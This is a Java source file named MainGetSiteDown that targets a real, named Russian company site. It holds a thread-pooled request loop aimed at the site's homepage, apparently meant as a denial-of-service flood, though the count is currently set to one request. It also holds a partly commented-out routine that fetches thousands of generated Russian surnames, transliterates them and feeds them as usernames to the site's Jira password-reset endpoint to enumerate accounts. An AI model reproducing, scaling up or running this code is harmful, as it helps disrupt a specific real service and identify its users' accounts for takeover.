import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static java.lang.Integer.*;

public class MainGetSiteDown {
    static int numOfThreads = Runtime.getRuntime().availableProcessors();
    static final String url = "https://jira.proitr.ru/secure/ForgotLoginDetails.jspa?forgotten=forgotPassword&email&atl_token&username=";
    static final String urlDDoss = "https://proitr.ru";
    static final String urlNick = "http://megagenerator.ru/namefio/";
    static int max = 1;

    static String alpha;
    static final String[] _alpha = {"a", "b", "v", "g", "d", "e", "yo", "g", "z", "i", "y", "i",
            "k", "l", "m", "n", "o", "p", "r", "s", "t", "u",
            "f", "h", "tz", "ch", "sh", "sh", "", "e", "yu", "ya"};

    public static void main(String[] args) throws Exception {
        alpha = new String("абвгдеёжзиыйклмнопрстуфхцчшщьэюя".getBytes(), "utf-8");
        ExecutorService executorService = Executors.newFixedThreadPool(numOfThreads);
        /*List<String> family = executorService.submit(new SendLoginData()).get();
        family.forEach(fam -> executorService.submit(new DownRunnable(renameFamily(fam))));*/
        while (max > 0){
            executorService.submit(new DDosnRunnable());
            max--;
        }
        executorService.shutdown();
    }

    static class DDosnRunnable implements Runnable {


        @Override
        public void run() {
            try {
                System.out.println(urlDDoss);
                HttpURLConnection connection = (HttpURLConnection) new URL(urlDDoss).openConnection();
                connection.setRequestMethod("GET");
                InputStream is = connection.getInputStream();
                byte[] bytes= new byte[is.available()];
                is.read(bytes);
                System.out.println(bytes.length);
                is.close();
                connection.disconnect();
            } catch (Exception ex) {
            }
        }
    }

    static class DownRunnable implements Runnable {
        String append;

        DownRunnable(String append) {
            this.append = append;
        }

        @Override
        public void run() {
            try {
                System.out.println(url + append);
                /*HttpURLConnection connection = (HttpURLConnection) new URL(url+append).openConnection();
                connection.setRequestMethod("GET");
                InputStream is = connection.getInputStream();
                byte[] bytes= new byte[is.available()];
                is.read(bytes);
                System.out.println(bytes.length);
                is.close();
                connection.disconnect();*/
            } catch (Exception ex) {
            }
        }
    }


    static class SendLoginData implements Callable<List<String>> {

        String resultString = null;
        List<String> resultList = null;

        @Override
        public List<String> call() {
            return doInBackground();
        }

        protected List<String> doInBackground() {
            try {
                String parammetrs = "test[]=1&test[]=fam&quantity=10000&select=russia";
                byte[] data = null;
                InputStream is = null;
                URL url = new URL(urlNick);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setRequestProperty("Content-Length", "" + Integer.toString(parammetrs.getBytes().length));
                OutputStream os = conn.getOutputStream();
                data = parammetrs.getBytes("UTF-8");
                os.write(data);
                data = null;
                conn.connect();
                int responseCode = conn.getResponseCode();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                if (responseCode == 200) {
                    is = conn.getInputStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {
                        baos.write(buffer, 0, bytesRead);
                    }
                    data = baos.toByteArray();
                    resultString = new String(data, "UTF-8");
                    resultList = new ArrayList<>();
                    StringTokenizer tok = new StringTokenizer(resultString, "<br>");
                    while (tok.hasMoreTokens()) {
                        resultList.add(tok.nextToken());
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return resultList;
        }
    }

    private static String renameFamily(String name) {
        name = name.toLowerCase();
        StringBuffer nname = new StringBuffer("");
        char[] chs = name.toCharArray();
        for (int i = 0; i < chs.length; i++) {
            int k = alpha.indexOf(chs[i]);
            if (k != -1)
                nname.append(_alpha[k]);
            else {
                nname.append(chs[i]);
            }
        }
        return nname.toString();
    }
}
